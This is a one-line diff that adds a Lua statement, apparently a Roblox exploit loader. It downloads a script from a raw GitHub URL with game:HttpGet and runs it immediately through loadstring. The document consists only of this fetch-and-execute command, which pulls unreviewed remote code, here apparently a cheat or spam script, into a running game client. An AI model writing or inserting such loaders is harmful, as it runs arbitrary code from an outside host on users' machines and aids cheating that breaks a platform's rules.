@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/drill-to-earth-s-core-spam1-0mbnykuqh0b4rz.lua"))()
